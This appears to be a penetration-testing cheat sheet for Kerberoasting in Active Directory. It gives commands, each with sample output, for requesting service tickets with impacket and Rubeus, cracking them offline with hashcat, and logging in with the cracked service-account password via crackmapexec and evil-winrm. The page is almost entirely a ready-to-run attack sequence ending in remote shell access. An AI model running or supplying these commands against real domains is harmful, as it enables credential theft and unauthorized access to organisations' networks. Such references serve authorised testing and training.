# KERBEROASTING

### Request service tickets

Get TGS tickets for SPNs — Any domain user can do this

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

<details>
<summary>Example Output</summary>

```
impacket-GetUserSPNs corp.local/john:Password1 -dc-ip 10.10.10.5 -request
$krb5tgs$23$*svc_sql$CORP.LOCAL$...

hashcat -m 13100 hash.txt rockyou.txt
svc_sql:SQLServiceP@ss!
(Kerberoasted service account password)
```
</details>

---

### Kerberoast with Rubeus

From Windows foothold — Alternative to impacket

```bash
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

<details>
<summary>Example Output</summary>

```
.\Rubeus.exe kerberoast /outfile:hashes.txt
[*] Found 2 Kerberoastable users
[*] SPN: MSSQLSvc/DB01:1433 - svc_sql
[*] Hash written to hashes.txt
```
</details>

---

### Crack TGS hashes

Offline cracking — Service account passwords

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

<details>
<summary>Example Output</summary>

```
hashcat -m 13100 hashes.txt rockyou.txt
$krb5tgs$23$*svc_sql*:SQLServiceP@ss!

Status: Cracked
Hash.Target: svc_sql
Password: SQLServiceP@ss!
```
</details>

---

### Use cracked password

Access with service account — Often has high privileges

```bash
crackmapexec smb <DC_IP> -u <svc_account> -p <cracked_pass>
evil-winrm if WinRM is open
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u svc_sql -p 'SQLServiceP@ss!'
[+] corp.local\svc_sql:SQLServiceP@ss! (Pwn3d!)

evil-winrm -i 10.10.10.5 -u svc_sql -p 'SQLServiceP@ss!'
*Evil-WinRM* PS> whoami
corp\svc_sql
```
</details>

---
